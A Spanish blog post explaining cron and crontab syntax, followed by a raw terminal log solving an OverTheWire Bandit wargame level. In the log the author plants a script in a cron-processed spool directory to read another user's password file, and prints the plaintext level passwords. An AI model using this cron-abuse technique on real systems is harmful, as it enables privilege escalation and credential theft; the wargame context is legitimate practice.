---
layout: ../../layouts/MarkdownPostLayout.astro
title: 'CRON'
pubDate: 2024-03-07
description: ''
author: 'Fabian Martinez Rincon'
image:
    url: '/posts/linux/CRON.jpg'
    alt: 'El logotipo completo de Astro.'
tags: ["ACL", "Permisos", "Linux"]
category: Linux
---

**Cron** es una herramienta y servicio de Unix y Linux diseñado para ejecutar tareas programadas automáticamente en horarios específicos. Es una de las herramientas más útiles en administración de sistemas para automatizar tareas repetitivas como respaldos, monitoreo de sistemas y tareas de mantenimiento.

### Componentes de Cron

- **Cron Jobs**: Son tareas específicas programadas para ejecutarse en tiempos predefinidos.
- **Crontab (Cron Table)**: Es el archivo donde se definen las tareas programadas. Cada usuario en un sistema puede tener su propio crontab, además del crontab del sistema.
- **Cron Daemon**: Es el servicio que ejecuta las tareas programadas en los horarios especificados. Funciona en el fondo (background) y verifica constantemente si hay tareas que necesitan ser ejecutadas.

### Sintaxis de Crontab

La sintaxis básica de un archivo crontab consiste en líneas de texto que siguen el formato:

```
MINUTO HORA DIA_DEL_MES MES DIA_DE_LA_SEMANA COMANDO
```

- **MINUTO**: Valor entre 0 y 59
- **HORA**: Valor entre 0 y 23
- **DIA_DEL_MES**: Valor entre 1 y 31
- **MES**: Valor entre 1 y 12
- **DIA_DE_LA_SEMANA**: Valor entre 0 y 6 (donde 0 representa domingo)
- **COMANDO**: El comando que se ejecutará

### Ejemplos de Crontab

1. **Ejecutar un script todos los días a medianoche**:
   ```
   0 0 * * * /ruta/al/script.sh
   ```
2. **Realizar un respaldo el primer día de cada mes a las 3 AM**:
   ```
   0 3 1 * * /ruta/al/script_de_respaldo.sh
   ```
3. **Ejecutar una tarea cada 15 minutos**:
   ```
   */15 * * * * /ruta/al/script_cada_15_minutos.sh
   ```

### Gestión de Crontab

- **Ver el Crontab Actual**: `crontab -l`
- **Editar el Crontab**: `crontab -e`
- **Eliminar el Crontab**: `crontab -r`

Cuando se edita un crontab, se utiliza el editor definido por la variable de entorno `EDITOR`. Si no está definida, por defecto suele ser `vi` o `nano`.

### Variables de Entorno en Crontab

Puedes definir variables de entorno al inicio del archivo crontab para usarlas en los comandos programados. Por ejemplo:

```
SHELL=/bin/bash
PATH=/usr/bin:/bin
MAILTO=usuario@example.com
* * * * * /ruta/al/script.sh
```

### Consideraciones de Seguridad y Prácticas Recomendadas

- **Seguridad**: Asegúrate de que los scripts ejecutados por cron no sean modificables por usuarios no autorizados. Esto puede evitar la ejecución de comandos maliciosos.
- **Pruebas**: Prueba los comandos manualmente antes de añadirlos a crontab para asegurarte de que funcionan como se espera.
- **Logs**: Cron generalmente guarda logs que pueden ser útiles para depurar problemas. Los logs suelen estar en `/var/log/cron` o similar, dependiendo de la distribución.

### Resolución de Problemas

Si un trabajo cron no se ejecuta como se esperaba, puedes verificar los siguientes puntos:

- **Permisos**: Asegúrate de que el script tenga permisos de ejecución.
- **Rutas Absolutas**: Usa rutas absolutas para comandos y archivos en tu script.
- **Entorno**: Recuerda que cron no carga el entorno completo de un usuario, por lo que algunas variables de entorno necesarias podrían no estar disponibles.

### Conclusión

Cron es una herramienta esencial para automatizar tareas en sistemas Linux y Unix. Su comprensión y manejo correcto pueden mejorar significativamente la eficiencia y la confiabilidad de los sistemas operativos.

![image](https://github.com/user-attachments/assets/17a23c81-b935-4546-a8f8-dc16f885b724)
![image](https://github.com/user-attachments/assets/8f371dbd-be81-497e-ad42-1c788934455d)

Nos creamos un directorio temporal (Al final no hacia falta)

![image](https://github.com/user-attachments/assets/b114a497-e620-41b7-a744-d82e9507cea5)

![image](https://github.com/user-attachments/assets/d5eb3dbb-c33b-429c-9732-b8df86071aa8)

- [Material](https://blog.desdelinux.net/cron-crontab-explicados/)

```bash
Connection to bandit.labs.overthewire.org closed.
❯ sshpass -p '0Zf11ioIjMVN551jX3CmStKLYqjk54Ga' ssh bandit23@bandit.labs.overthewire.org -p 2220
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|
                                                       

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames


      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to the #wargames channel on
discord or IRC.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
  restricted so that users cannot snoop on eachother. Files and directories
  with easily guessable or short names will be periodically deleted! The /tmp
  directory is regularly wiped.
  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few useful tools which you can find
 in the following locations:

    * gef (https://github.com/hugsy/gef) in /opt/gef/
    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
    * peda (https://github.com/longld/peda.git) in /opt/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us on discord or IRC.

  Enjoy your stay!

bandit23@bandit:~$ cd /etc/cron.d
bandit23@bandit:/etc/cron.d$ ls -l
total 24
-rw-r--r-- 1 root root 120 Jul 17 15:57 cronjob_bandit22
-rw-r--r-- 1 root root 122 Jul 17 15:57 cronjob_bandit23
-rw-r--r-- 1 root root 120 Jul 17 15:57 cronjob_bandit24
-rw-r--r-- 1 root root 201 Apr  8 14:38 e2scrub_all
-rwx------ 1 root root  52 Jul 17 15:59 otw-tmp-dir
-rw-r--r-- 1 root root 396 Jan  9  2024 sysstat
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh 
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:/etc/cron.d$ cd $HOME
bandit23@bandit:~$ cd ..
bandit23@bandit:/home$ ls
bandit0   bandit14  bandit2   bandit25      bandit29      bandit31-git  bandit7    drifter12  drifter4  formulaone0  krypton1  krypton7
bandit1   bandit15  bandit20  bandit26      bandit29-git  bandit32      bandit8    drifter13  drifter5  formulaone1  krypton2  ubuntu
bandit10  bandit16  bandit21  bandit27      bandit3       bandit33      bandit9    drifter14  drifter6  formulaone2  krypton3
bandit11  bandit17  bandit22  bandit27-git  bandit30      bandit4       drifter0   drifter15  drifter7  formulaone3  krypton4
bandit12  bandit18  bandit23  bandit28      bandit30-git  bandit5       drifter1   drifter2   drifter8  formulaone5  krypton5
bandit13  bandit19  bandit24  bandit28-git  bandit31      bandit6       drifter10  drifter3   drifter9  formulaone6  krypton6
bandit23@bandit:/home$ cd ..
bandit23@bandit:/$ ls
bin                dev      formulaone  lib    lib.usr-is-merged  media  proc  sbin                srv  usr
bin.usr-is-merged  drifter  home        lib32  libx32             mnt    root  sbin.usr-is-merged  sys  var
boot               etc      krypton     lib64  lost+found         opt    run   snap                tmp
bandit23@bandit:/$ cat /etc/bandit_pass/bandit23 
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
bandit23@bandit:/$ cat /etc/bandit_pass/bandit24 
cat: /etc/bandit_pass/bandit24: Permission denied
bandit23@bandit:/$ cd /etc/cron.d
bandit23@bandit:/etc/cron.d$ cd /var/spool/bandit4/foo 
-bash: cd: /var/spool/bandit4/foo: No such file or directory
bandit23@bandit:/etc/cron.d$ cat /var/spool/bandit4/foo
cat: /var/spool/bandit4/foo: No such file or directory
bandit23@bandit:/etc/cron.d$ cat /var/spool/bandit24/foo
cat: /var/spool/bandit24/foo: Permission denied
bandit23@bandit:/etc/cron.d$ ls /var/spool/bandit24/foo  
ls: cannot open directory '/var/spool/bandit24/foo': Permission denied
bandit23@bandit:/etc/cron.d$ ls /var/spool/bandit24    
foo
bandit23@bandit:/etc/cron.d$ ls -l
total 24
-rw-r--r-- 1 root root 120 Jul 17 15:57 cronjob_bandit22
-rw-r--r-- 1 root root 122 Jul 17 15:57 cronjob_bandit23
-rw-r--r-- 1 root root 120 Jul 17 15:57 cronjob_bandit24
-rw-r--r-- 1 root root 201 Apr  8 14:38 e2scrub_all
-rwx------ 1 root root  52 Jul 17 15:59 otw-tmp-dir
-rw-r--r-- 1 root root 396 Jan  9  2024 sysstat
bandit23@bandit:/etc/cron.d$ ls -l /var/spool/bandit24
total 4
drwxrwx-wx 6 root bandit24 4096 Jul 23 02:39 foo
bandit23@bandit:/etc/cron.d$ mktemp
/tmp/tmp.AKHXJUtTS9
bandit23@bandit:/etc/cron.d$ nano /tmp/tmp.AKHXJUtTS9
Error opening terminal: xterm-kitty.
bandit23@bandit:/etc/cron.d$ export TERM=xterm
bandit23@bandit:/etc/cron.d$ nano /tmp/tmp.AKHXJUtTS9
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/etc/cron.d$ cat /etc/bandit_pass/bandit23 > /tmp/tmp.AKHXJUtTS9
bandit23@bandit:/etc/cron.d$ nano /tmp/tmp.AKHXJUtTS9
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/etc/cron.d$ mktemp -d
/tmp/tmp.65XRzdzv59
bandit23@bandit:/etc/cron.d$ cd /tmp/tmp.AKHXJUtTS9
-bash: cd: /tmp/tmp.AKHXJUtTS9: Not a directory
bandit23@bandit:/etc/cron.d$ cd /tmp/
bandit23@bandit:/tmp$ nano scriptYa.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp$ nano scriptYa.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp$ cat scriptYa.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.AKHXJUtTS9
bandit23@bandit:/tmp$ cp scriptYa.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp$ 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga: command not found
bandit23@bandit:/tmp$ /tmp/tmp.AKHXJUtTS9
-bash: /tmp/tmp.AKHXJUtTS9: Permission denied
bandit23@bandit:/tmp$ cd /tmp/tmp.AKHXJUtTS9
-bash: cd: /tmp/tmp.AKHXJUtTS9: Not a directory
bandit23@bandit:/tmp$ cat /tmp/tmp.AKHXJUtTS9
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
bandit23@bandit:/tmp$ cp scriptYa.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp$ ls -l
ls: cannot open directory '.': Permission denied
bandit23@bandit:/tmp$ chmod +x scriptYa.sh
bandit23@bandit:/tmp$ cp scriptYa.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp$ cat /tmp/tmp.AKHXJUtTS9
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
bandit23@bandit:/tmp$ cat scriptYa.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.AKHXJUtTS9
bandit23@bandit:/tmp$ cat /tmp/tmp.AKHXJUtTS9
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
bandit23@bandit:/tmp$ cp scriptYa.sh /var/spool/bandit24/
cp: cannot create regular file '/var/spool/bandit24/scriptYa.sh': Operation not permitted
bandit23@bandit:/tmp$ cp scriptYa.sh /var/spool/bandit24/foo/nuevo.sh
bandit23@bandit:/tmp$ cat scriptYa.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.AKHXJUtTS9
bandit23@bandit:/tmp$ cat /tmp/tmp.AKHXJUtTS9
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
bandit23@bandit:/tmp$ cat /usr/bin/cronjob_bandit24.sh 
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:/tmp$ ls
ls: cannot open directory '.': Permission denied
bandit23@bandit:/tmp$ cat scriptYa.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.AKHXJUtTS9
bandit23@bandit:/tmp$ cd /car/spool/
-bash: cd: /car/spool/: No such file or directory
bandit23@bandit:/tmp$ cd /var/spool/
bandit23@bandit:/var/spool$ ls
bandit24  cron  mail  rsyslog
bandit23@bandit:/var/spool$ cd bandit24/
bandit23@bandit:/var/spool/bandit24$ ls
foo
bandit23@bandit:/var/spool/bandit24$ ls -l
total 4
drwxrwx-wx 6 root bandit24 4096 Jul 23 02:55 foo
bandit23@bandit:/var/spool/bandit24$ nano script.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/var/spool/bandit24$ CAT script.sh
Command 'CAT' not found, but can be installed with:
apt install cat-bat
Please ask your administrator.
bandit23@bandit:/var/spool/bandit24$ CAT script.sh
Command 'CAT' not found, but can be installed with:
apt install cat-bat
Please ask your administrator.
bandit23@bandit:/var/spool/bandit24$ cat script.sh
cat: script.sh: No such file or directory
bandit23@bandit:/var/spool/bandit24$ #!/bin/bash
bandit23@bandit:/var/spool/bandit24$ "#!bin/bash/; cat /etc/bandit_pass/bandit24 > /tmp/tmp.AKHXJUtTS9" > /foo/nuevo.sh
-bash: !bin/bash/: event not found
bandit23@bandit:/var/spool/bandit24$ echo "#!bin/bash/; cat /etc/bandit_pass/bandit24 > /tmp/tmp.AKHXJUtTS9" > /foo/nuevo.sh
-bash: !bin/bash/: event not found
bandit23@bandit:/var/spool/bandit24$ c"#!bin/bash; cat /etc/bandit_pass/bandit24 > /tmp/tmp.AKHXJUtTS9" > /foo/nuevo.sh
-bash: !bin/bash: event not found
bandit23@bandit:/var/spool/bandit24$ vim nuevo
bandit23@bandit:/var/spool/bandit24$ mktemp -d
/tmp/tmp.hRk5izjyGn
bandit23@bandit:/var/spool/bandit24$ cd /tmp/tmp.hRk5izjyGn
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ touch dios.sh
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ chmod 777 dios.sh
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ touch resultado.txt
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ chmod 777 resultado.txt
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ pwd
/tmp/tmp.hRk5izjyGn
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ vim dios.sh 
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ cat /tmp/tmp.hRk5izjyGn/resultado.txt 
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ vim dios.sh 
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ cp dios.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ cat /tmp/tmp.hRk5izjyGn/resultado.txt 
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ ls -l
total 4
-rwxrwxrwx 1 bandit23 bandit23 78 Jul 23 03:05 dios.sh
-rwxrwxrwx 1 bandit23 bandit23  0 Jul 23 03:03 resultado.txt
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ ./dios.sh 
cat: /etc/bandit_pass/bandit24: Permission denied
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ nvim dios.sh 
Command 'nvim' not found, but can be installed with:
snap install nvim    # version v0.10.0, or
apt  install neovim  # version 0.7.2-8
See 'snap info nvim' for additional versions.
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ cp dios.sh /var/spool/bandit24
cp: cannot create regular file '/var/spool/bandit24/dios.sh': Operation not permitted
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ cp dios.sh /var/spool/bandit24/
cp: cannot create regular file '/var/spool/bandit24/dios.sh': Operation not permitted
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ cp dios.sh /var/spool/bandit24/fo
cp: cannot create regular file '/var/spool/bandit24/fo': Operation not permitted
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ cp dios.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ vim dios.sh 
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ ./dios.sh 
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ cat resultado.txt 
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ vim dios.sh 
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ vim dios.sh 
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ cp dios.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ cat resultado.txt 
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ vim dios.sh 
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ cp dios.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ cp dios.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ pwd
/tmp/tmp.hRk5izjyGn
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ vim dios.sh 
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ cp dios.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ cat resultado.txt 
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ vim dios.sh 
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ cp dios.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ chmod 777 /tmp/tmp.hRk5izjyGn
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ cp dios.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ ls
dios.sh  resultado.txt
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ cp dios.sh /var/spool/bandit24/nuevo
cp: cannot create regular file '/var/spool/bandit24/nuevo': Operation not permitted
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ cp dios.sh /var/spool/bandit24/fo
cp: cannot create regular file '/var/spool/bandit24/fo': Operation not permitted
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ cp dios.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ ls
diosMio.txt  dios.sh  resultado.txt
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ cat diosMio.txt 
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
bandit23@bandit:/tmp/tmp.hRk5izjyGn$ 
```

![image](https://github.com/user-attachments/assets/865fb595-ad58-4d47-87b6-be009f75d25c)
![image](https://github.com/user-attachments/assets/7ac2aa7b-378b-4bd6-a7e7-cd321591c35c)
![image](https://github.com/user-attachments/assets/c28a67f8-1869-438d-8427-7195314ead66)
![image](https://github.com/user-attachments/assets/c11ba8dc-bae7-44ef-8425-be5be884e0ce)
![image](https://github.com/user-attachments/assets/7048e552-8958-4284-83f4-ef4a6a50cd65)
![image](https://github.com/user-attachments/assets/b9a4629f-121b-4c81-a29d-34d2dde58f02)
![image](https://github.com/user-attachments/assets/1e3bd72f-1e78-4cea-b690-d03aaf6e3533)
![image](https://github.com/user-attachments/assets/dea2ae4a-88fe-4e8e-a1e9-29f703d5c9d2)
![image](https://github.com/user-attachments/assets/fda65325-b9df-4bc3-90a5-03bdd3dcba2b)
![image](https://github.com/user-attachments/assets/ac2de026-4c19-45cd-8d13-c153e6a349ec)